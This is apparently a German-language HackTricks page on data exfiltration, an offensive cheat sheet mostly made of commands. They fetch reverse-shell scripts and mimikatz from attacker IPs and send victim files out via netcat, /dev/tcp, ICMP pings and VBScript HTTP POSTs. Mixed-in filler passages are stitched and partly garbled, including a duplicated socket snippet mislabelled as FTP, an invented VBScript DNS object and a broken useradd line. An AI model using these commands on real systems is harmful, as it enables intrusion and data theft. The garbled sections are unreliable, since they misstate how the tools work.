# Exfiltration

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Schwachstellen, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Häufig whitelistete Domains zur Informations-Exfiltration

Überprüfen Sie [https://lots-project.com/](https://lots-project.com/), um häufig whitelistete Domains zu finden, die missbraucht werden können.

## Kopieren & Einfügen von Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

Windows is the most widely used operating system, making it a prime target for hackers. In this section, we will explore various exfiltration techniques that can be used on Windows systems.

1. **Data Compression**: One common method of exfiltrating data is by compressing it into a smaller file size. This can be done using tools like 7-Zip or WinRAR. The compressed file can then be transferred through various channels, such as email or file sharing services.

2. **Steganography**: Steganography involves hiding data within other files or images. There are several tools available, such as OpenStego or Steghide, that can be used to embed data into innocent-looking files. These files can then be transferred without arousing suspicion.

3. **DNS Tunneling**: DNS tunneling is a technique that allows data to be exfiltrated through DNS requests. Tools like Dns2tcp or Iodine can be used to establish a covert communication channel between the attacker's machine and a DNS server. This method can bypass firewalls and other security measures.

4. **Covert Channels**: Covert channels involve using legitimate protocols or services to transmit data. For example, an attacker can use the FTP protocol to transfer files or the HTTP protocol to send data through web requests. By disguising the exfiltration as normal network traffic, it becomes harder to detect.

5. **Cloud Storage**: Cloud storage services like Dropbox or Google Drive can be used to exfiltrate data from a compromised Windows system. Attackers can upload files to these services and then access them from another machine. This method allows for easy and convenient data exfiltration.

It is important to note that these techniques should only be used for ethical purposes, such as penetration testing or securing systems against potential attacks. Unauthorized use of these techniques is illegal and can result in severe consequences.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Dateien hochladen

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer, das GET- und POST-Anfragen (auch Header) ausgibt**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python-Modul [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS-Server**

Ein HTTPS-Server ist ein Server, der das HTTPS-Protokoll verwendet, um verschlüsselte Verbindungen herzustellen. HTTPS steht für Hypertext Transfer Protocol Secure und bietet eine sichere Kommunikation über das Internet. Im Gegensatz zum herkömmlichen HTTP verwendet HTTPS eine SSL/TLS-Verschlüsselung, um die Daten während der Übertragung zu schützen.

Ein HTTPS-Server kann verwendet werden, um vertrauliche Informationen sicher zu übertragen, da die Daten während der Übertragung verschlüsselt sind. Dies ist besonders wichtig bei der Übertragung von sensiblen Daten wie Passwörtern, Kreditkarteninformationen oder persönlichen Informationen.

Um einen HTTPS-Server einzurichten, benötigen Sie ein SSL/TLS-Zertifikat, das von einer vertrauenswürdigen Zertifizierungsstelle ausgestellt wurde. Dieses Zertifikat bestätigt die Identität des Servers und ermöglicht es den Clients, die Verbindung zu überprüfen.

Sobald der HTTPS-Server eingerichtet ist, können Clients über ihren Webbrowser oder andere HTTPS-fähige Anwendungen eine sichere Verbindung herstellen. Der Server und der Client verhandeln die Verschlüsselungsmethode und den Schlüsselaustauschalgorithmus, um eine sichere Verbindung herzustellen.

Die Verwendung eines HTTPS-Servers bietet eine erhöhte Sicherheit und schützt vor Man-in-the-Middle-Angriffen, bei denen ein Angreifer versucht, die Kommunikation zwischen dem Server und dem Client abzufangen oder zu manipulieren.

Es ist wichtig, dass der HTTPS-Server ordnungsgemäß konfiguriert ist, um maximale Sicherheit zu gewährleisten. Dazu gehören die Verwendung starker Verschlüsselungsalgorithmen, die Aktualisierung von Sicherheitspatches und die regelmäßige Überprüfung der Serverkonfiguration auf Sicherheitslücken.

Insgesamt bietet ein HTTPS-Server eine sichere Möglichkeit, Daten über das Internet zu übertragen und die Privatsphäre und Vertraulichkeit der Benutzer zu schützen.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP-Server (Python)

```python
import socket
import os

def send_file(file_path, host, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the FTP server
    s.connect((host, port))

    # Open the file in binary mode
    with open(file_path, 'rb') as file:
        # Get the file size
        file_size = os.path.getsize(file_path)

        # Send the file size to the server
        s.send(str(file_size).encode())

        # Send the file contents to the server
        s.sendfile(file)

    # Close the socket connection
    s.close()

def receive_file(file_path, host, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the FTP server
    s.connect((host, port))

    # Receive the file size from the server
    file_size = int(s.recv(1024).decode())

    # Create a new file to write the received data
    with open(file_path, 'wb') as file:
        # Receive the file contents from the server
        while file_size > 0:
            data = s.recv(1024)
            file.write(data)
            file_size -= len(data)

    # Close the socket connection
    s.close()
```

Dieser Python-Code ermöglicht das Senden und Empfangen von Dateien über einen FTP-Server.

```python
import socket
import os

def send_file(file_path, host, port):
    # Erstelle ein Socket-Objekt
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Verbinde mit dem FTP-Server
    s.connect((host, port))

    # Öffne die Datei im Binärmodus
    with open(file_path, 'rb') as file:
        # Ermittle die Dateigröße
        file_size = os.path.getsize(file_path)

        # Sende die Dateigröße an den Server
        s.send(str(file_size).encode())

        # Sende den Dateiinhalt an den Server
        s.sendfile(file)

    # Schließe die Socket-Verbindung
    s.close()

def receive_file(file_path, host, port):
    # Erstelle ein Socket-Objekt
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Verbinde mit dem FTP-Server
    s.connect((host, port))

    # Empfange die Dateigröße vom Server
    file_size = int(s.recv(1024).decode())

    # Erstelle eine neue Datei zum Schreiben der empfangenen Daten
    with open(file_path, 'wb') as file:
        # Empfange den Dateiinhalt vom Server
        while file_size > 0:
            data = s.recv(1024)
            file.write(data)
            file_size -= len(data)

    # Schließe die Socket-Verbindung
    s.close()
```
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP-Server (NodeJS)

#### Beschreibung

Ein FTP-Server (File Transfer Protocol) ist ein Server, der es Benutzern ermöglicht, Dateien über das Internet zu übertragen. In diesem Fall handelt es sich um einen FTP-Server, der mit NodeJS implementiert wurde.

#### Exfiltration

Um Daten von einem FTP-Server zu exfiltrieren, können verschiedene Methoden verwendet werden:

1. **Standard FTP-Befehle**: Verwenden Sie die Standard-FTP-Befehle wie `GET`, `PUT`, `LIST`, um Dateien herunterzuladen, hochzuladen oder eine Liste der verfügbaren Dateien abzurufen.

2. **FTP-Befehle mit Wildcards**: Verwenden Sie Wildcards wie `*` oder `?`, um Dateien basierend auf bestimmten Mustern herunterzuladen. Zum Beispiel können Sie den Befehl `GET *.txt` verwenden, um alle Textdateien herunterzuladen.

3. **FTP-Befehle mit Verzeichniswechsel**: Verwenden Sie den Befehl `CD` (Change Directory), um das Verzeichnis zu wechseln, und führen Sie dann die gewünschten FTP-Befehle aus, um Dateien in diesem Verzeichnis herunterzuladen oder hochzuladen.

4. **FTP-Befehle mit Dateiberechtigungen**: Verwenden Sie den Befehl `CHMOD` (Change Mode), um die Berechtigungen von Dateien auf dem FTP-Server zu ändern. Dadurch können Sie Dateien lesen, schreiben oder ausführen, je nach den gewünschten Aktionen.

#### Beispiel

Hier ist ein Beispiel für die Verwendung des FTP-Servers (NodeJS) zur Exfiltration von Daten:

```bash
# Verbindung zum FTP-Server herstellen
ftp <server-ip>

# Anmelden mit Benutzername und Passwort
<username>
<password>

# Dateien herunterladen
GET file.txt

# Dateien hochladen
PUT file.txt

# Liste der verfügbaren Dateien abrufen
LIST
```

#### Gegenmaßnahmen

Um die Exfiltration von Daten über einen FTP-Server zu verhindern, können folgende Gegenmaßnahmen ergriffen werden:

1. **Sicherheitsrichtlinien**: Implementieren Sie Sicherheitsrichtlinien, die den Zugriff auf den FTP-Server einschränken und nur autorisierten Benutzern erlauben, Dateien hochzuladen oder herunterzuladen.

2. **Verschlüsselung**: Verwenden Sie eine sichere Verschlüsselung, wie z.B. SSL/TLS, um die Übertragung von Daten zwischen dem FTP-Server und den Benutzern zu schützen.

3. **Starke Authentifizierung**: Verwenden Sie starke Authentifizierungsmethoden, wie z.B. die Verwendung von sicheren Passwörtern oder die Implementierung von Zwei-Faktor-Authentifizierung, um unbefugten Zugriff auf den FTP-Server zu verhindern.

4. **Überwachung und Protokollierung**: Implementieren Sie eine Überwachung und Protokollierung, um verdächtige Aktivitäten auf dem FTP-Server zu erkennen und darauf zu reagieren.

#### Weitere Ressourcen

- [NodeJS FTP-Server-Dokumentation](https://www.npmjs.com/package/ftp-server)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP-Server (pure-ftp)

FTP (File Transfer Protocol) ist ein weit verbreitetes Protokoll zum Übertragen von Dateien über ein Netzwerk. Ein FTP-Server ermöglicht es Benutzern, Dateien von ihrem lokalen Computer auf den Server hochzuladen oder Dateien vom Server auf ihren lokalen Computer herunterzuladen.

Pure-FTP ist ein beliebter FTP-Server, der für seine Sicherheit und Stabilität bekannt ist. Es bietet verschiedene Funktionen wie SSL/TLS-Verschlüsselung, virtuelle Benutzer, Bandbreitenbegrenzung und vieles mehr.

#### Exfiltration über FTP

Die Exfiltration von Daten über einen FTP-Server kann eine effektive Methode sein, um sensible Informationen aus einem Zielnetzwerk zu extrahieren. Hier sind einige Möglichkeiten, wie dies erreicht werden kann:

1. **Dateiübertragung**: Der Angreifer kann Dateien von einem kompromittierten System auf den FTP-Server hochladen. Dies kann durch den direkten Zugriff auf das Dateisystem oder durch den Einsatz von Malware erreicht werden, die automatisch Dateien auf den FTP-Server überträgt.

2. **Tunneling**: Der Angreifer kann einen verschlüsselten Tunnel zwischen dem kompromittierten System und dem FTP-Server einrichten. Dadurch können Daten sicher übertragen werden, ohne dass sie von Sicherheitsmaßnahmen im Netzwerk erkannt werden.

3. **Versteckte Informationen**: Der Angreifer kann sensible Informationen in scheinbar harmlosen Dateien verstecken, die dann auf den FTP-Server hochgeladen werden. Dies kann durch das Einbetten von Daten in Bildern, Audiodateien oder anderen Dateiformaten erreicht werden.

Es ist wichtig zu beachten, dass die Exfiltration von Daten über einen FTP-Server in den meisten Fällen nicht unbemerkt bleibt. Netzwerküberwachungstools können verdächtige Aktivitäten erkennen und Alarm schlagen. Daher ist es ratsam, zusätzliche Maßnahmen zu ergreifen, um die Exfiltration zu verschleiern, wie z.B. die Verwendung von verschlüsselten Verbindungen oder das Ausnutzen von Schwachstellen im FTP-Server.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows**-Client

Der Windows-Client ist das Betriebssystem von Microsoft für Personal Computer. Es ist weit verbreitet und bietet verschiedene Möglichkeiten zur Datenexfiltration. Hier sind einige gängige Methoden:

#### 1. **Verstecken von Daten in Bildern**

Diese Methode beinhaltet das Verstecken von sensiblen Daten in Bildern, um sie unbemerkt aus dem System zu extrahieren. Tools wie Steghide und OpenStego können verwendet werden, um diese Art der Exfiltration durchzuführen.

#### 2. **Verwendung von Cloud-Speicherdiensten**

Cloud-Speicherdienste wie Dropbox, Google Drive und OneDrive können genutzt werden, um Daten aus dem System zu exfiltrieren. Dateien können in den Cloud-Speicher hochgeladen und von einem anderen Gerät heruntergeladen werden.

#### 3. **Verwendung von E-Mail-Diensten**

E-Mail-Dienste wie Gmail, Outlook und Yahoo können verwendet werden, um Daten zu exfiltrieren. Dateien können als E-Mail-Anhänge verschickt werden, um sie aus dem System zu entfernen.

#### 4. **Verwendung von Remote-Verwaltungstools**

Remote-Verwaltungstools wie TeamViewer und AnyDesk ermöglichen den Fernzugriff auf das System. Diese Tools können verwendet werden, um Dateien von einem entfernten Standort aus herunterzuladen.

#### 5. **Verwendung von USB-Geräten**

USB-Geräte wie Flash-Laufwerke und externe Festplatten können verwendet werden, um Daten aus dem System zu kopieren und physisch zu exfiltrieren.

#### 6. **Verwendung von Netzwerkprotokollen**

Netzwerkprotokolle wie FTP, HTTP und SMB können verwendet werden, um Daten über das Netzwerk zu exfiltrieren. Dateien können über diese Protokolle auf einen Remote-Server hochgeladen werden.

Es ist wichtig zu beachten, dass diese Methoden illegal sind und nur zu Bildungszwecken verwendet werden sollten. Jegliche illegale Nutzung dieser Methoden kann zu rechtlichen Konsequenzen führen.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Schwachstellen, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali als Server
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Oder erstellen Sie einen SMB-Share **mit Samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location. This can be a critical step in a hacking operation, as it allows the attacker to steal sensitive information from the compromised system.

There are several methods that can be used for exfiltration, depending on the target system and the available resources. Here are some common techniques:

## 1. File Transfer Protocols

File Transfer Protocol (FTP), Secure Copy Protocol (SCP), and Hypertext Transfer Protocol (HTTP) are commonly used protocols for transferring files over a network. Attackers can leverage these protocols to exfiltrate data from a compromised system to an external server.

## 2. Covert Channels

Covert channels are hidden communication channels that can be used to transfer data without being detected. These channels can be created using various techniques, such as encoding data in DNS queries or using steganography to hide data within innocent-looking files.

## 3. Data Exfiltration Tools

There are several tools available that are specifically designed for exfiltrating data from compromised systems. These tools often use encryption and compression techniques to ensure the stolen data remains hidden and secure during transit.

## 4. Cloud Storage Services

Cloud storage services, such as Dropbox or Google Drive, can be used to exfiltrate data from a compromised system. Attackers can upload the stolen data to these services and then access it from a different location.

## 5. Email

Email can also be used as a means of exfiltration. Attackers can send the stolen data as attachments or use techniques like steganography to hide the data within the email itself.

## 6. Physical Access

In some cases, attackers may gain physical access to a target system and directly copy the data onto a removable storage device, such as a USB drive. This method can be particularly effective as it bypasses network security measures.

It is important for organizations to implement strong security measures to prevent data exfiltration. This includes monitoring network traffic, restricting access to sensitive data, and regularly updating security systems to detect and prevent exfiltration attempts.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

Der Angreifer muss SSHd ausgeführt haben.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Wenn das Opfer SSH hat, kann der Angreifer ein Verzeichnis vom Opfer zum Angreifer mounten.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) ist ein vielseitiges Netzwerk-Tool, das für verschiedene Zwecke verwendet werden kann, einschließlich der Exfiltration von Daten. Es ermöglicht die Übertragung von Daten über das Netzwerk und kann sowohl als Server als auch als Client fungieren.

Um Daten mit NC zu exfiltrieren, können Sie den Client-Modus verwenden, um eine Verbindung zu einem Remote-Server herzustellen und die Daten an diesen Server zu senden. Sie können auch den Server-Modus verwenden, um einen lokalen Server zu erstellen, der Daten von einem Remote-Client empfängt.

Um Daten mit NC zu exfiltrieren, können Sie den folgenden Befehl verwenden:

```
nc <ziel-ip> <ziel-port> < datei
```

Dieser Befehl sendet den Inhalt der Datei an die angegebene IP-Adresse und den angegebenen Port. Sie können auch den Befehl `nc -l <port> > datei` verwenden, um einen Server zu erstellen, der Daten von einem Remote-Client empfängt und sie in eine Datei schreibt.

Es ist wichtig zu beachten, dass NC nicht verschlüsselt ist und daher nicht für die Übertragung sensibler Daten über unsichere Netzwerke empfohlen wird. Es ist auch wichtig, die rechtlichen und ethischen Aspekte der Datenexfiltration zu berücksichtigen und sicherzustellen, dass Sie die erforderlichen Berechtigungen haben, um auf die Daten zuzugreifen und sie zu exfiltrieren.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
To download a file from the victim using the `/dev/tcp` method, you can use the following command:

```bash
cat < /dev/tcp/<victim_ip>/<port> > <local_file>
```

Replace `<victim_ip>` with the IP address of the victim machine and `<port>` with the desired port number. `<local_file>` should be replaced with the name of the file you want to save the downloaded content to.

For example, to download a file from a victim with IP address `192.168.0.100` on port `8080` and save it as `downloaded_file.txt`, you would use the following command:

```bash
cat < /dev/tcp/192.168.0.100/8080 > downloaded_file.txt
```

This command will establish a connection to the victim machine on the specified port and redirect the content to the specified local file.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Datei auf das Opfer hochladen

Um Dateien auf das Opfer hochzuladen, gibt es verschiedene Methoden, je nach den verfügbaren Angriffsvektoren. Hier sind einige gängige Methoden:

1. **Dateiübertragung über das Netzwerk**: Wenn Sie Zugriff auf das Netzwerk des Opfers haben, können Sie Dateien über das Netzwerkprotokoll wie FTP, SMB oder SCP übertragen. Verwenden Sie Tools wie `ftp`, `smbclient` oder `scp`, um die Dateien auf das Opfersystem hochzuladen.

2. **Webbasierte Dateiübertragung**: Wenn das Opfer eine Webanwendung hostet, können Sie Dateien über eine Datei-Upload-Funktion hochladen. Verwenden Sie Tools wie `curl` oder `wget`, um eine POST-Anfrage mit der Datei an die entsprechende URL zu senden.

3. **E-Mail-Anhänge**: Wenn das Opfersystem E-Mails senden und empfangen kann, können Sie Dateien als E-Mail-Anhänge hochladen. Verwenden Sie Tools wie `sendmail` oder `mailx`, um eine E-Mail mit der Datei als Anhang zu senden.

4. **Social Engineering**: Eine weitere Methode besteht darin, das Opfer dazu zu bringen, die Datei selbst herunterzuladen und auszuführen. Dies kann durch das Versenden einer Phishing-E-Mail mit einem bösartigen Anhang oder das Erstellen einer gefälschten Website erreicht werden, auf der die Datei zum Download angeboten wird.

Es ist wichtig zu beachten, dass das Hochladen von Dateien auf das Opfersystem illegal ist, es sei denn, Sie haben die ausdrückliche Erlaubnis des Eigentümers. Das Hochladen von Dateien sollte nur im Rahmen einer legitimen Penetrationstest- oder Sicherheitsüberprüfung durchgeführt werden.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
Dank an **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Wenn Sie Daten an einen SMTP-Server senden können, können Sie mit Python einen SMTP erstellen, um die Daten zu empfangen:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Standardmäßig in XP und 2003 (bei anderen muss es während der Installation explizit hinzugefügt werden)

In Kali, **starte TFTP-Server**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP-Server in Python:**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # Read request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the read request and send the file
            # ...

        elif opcode == 2:
            # Write request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the write request and receive the file
            # ...

        else:
            # Invalid opcode
            error_packet = struct.pack('!HH', 5, 4) + b'Invalid opcode\x00'
            server_socket.sendto(error_packet, client_address)

    server_socket.close()

tftp_server()
```

Dieser Python-Code implementiert einen TFTP-Server. Der Server erstellt einen UDP-Socket und bindet ihn an den Port 69. Der Server empfängt eingehende Datenpakete und analysiert den Opcode, um festzustellen, ob es sich um eine Lese- oder Schreibanforderung handelt. Bei einer Leseanforderung wird der Dateiname und der Modus extrahiert und die entsprechende Verarbeitung durchgeführt. Bei einer Schreibanforderung wird der Dateiname und der Modus extrahiert und die Datei empfangen. Bei einer ungültigen Opcode wird ein Fehlerpaket an den Client gesendet. Der Server läuft in einer Endlosschleife und wartet auf eingehende Anforderungen.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
In **Opfer**, verbinden Sie sich mit dem Kali-Server:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Laden Sie eine Datei mit einem PHP-Oneliner herunter:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) ist eine Skriptsprache, die von Microsoft entwickelt wurde und in Windows-Umgebungen verwendet wird. Sie wird häufig für die Automatisierung von Aufgaben und die Erstellung von Skripten verwendet.

### Exfiltration mit VBScript

VBScript kann auch für die Exfiltration von Daten verwendet werden. Hier sind einige Techniken, die verwendet werden können:

#### 1. Dateiübertragung über HTTP

Mit VBScript können Sie Daten über das HTTP-Protokoll exfiltrieren. Sie können eine HTTP-Anfrage senden, um Daten an einen Remote-Server zu senden. Dies kann zum Beispiel verwendet werden, um gestohlene Daten an einen Angreifer zu senden.

```vbscript
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objXMLHTTP.open "POST", "http://remote-server.com/exfiltrate.php", False
objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objXMLHTTP.send "data=" & data
```

#### 2. E-Mail-Exfiltration

VBScript kann auch verwendet werden, um Daten per E-Mail zu exfiltrieren. Sie können eine E-Mail erstellen und die Daten als Anhang hinzufügen. Anschließend können Sie die E-Mail an einen Remote-Server senden.

```vbscript
Set objMessage = CreateObject("CDO.Message")
objMessage.Subject = "Exfiltrated Data"
objMessage.From = "attacker@domain.com"
objMessage.To = "receiver@domain.com"
objMessage.TextBody = "Exfiltrated data attached."
objMessage.AddAttachment "C:\path\to\data.txt"
objMessage.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objMessage.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.server.com"
objMessage.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objMessage.Configuration.Fields.Update
objMessage.Send
```

#### 3. DNS-Exfiltration

VBScript kann auch verwendet werden, um Daten über das DNS-Protokoll zu exfiltrieren. Sie können eine DNS-Anfrage senden, um Daten in den DNS-Namen einzubetten und an einen Remote-Server zu senden.

```vbscript
Set objDNS = CreateObject("DNSResolver")
objDNS.QueryType = DNS_TYPE_TEXT
objDNS.AddServer "remote-server.com"
objDNS.SendQuery "data=" & data
```

#### 4. Exfiltration über andere Protokolle

VBScript kann auch für die Exfiltration über andere Protokolle wie FTP, SMB oder sogar ICMP verwendet werden. Die Techniken variieren je nach Protokoll, aber das Grundprinzip besteht darin, Daten über das entsprechende Protokoll an einen Remote-Server zu senden.

### Zusammenfassung

VBScript ist eine leistungsstarke Skriptsprache, die für die Exfiltration von Daten verwendet werden kann. Es bietet verschiedene Techniken, um Daten über verschiedene Protokolle zu exfiltrieren, einschließlich HTTP, E-Mail, DNS und andere. Es ist wichtig zu beachten, dass diese Techniken nur zu legitimen Zwecken verwendet werden sollten und nicht für illegale Aktivitäten.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Opfer**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
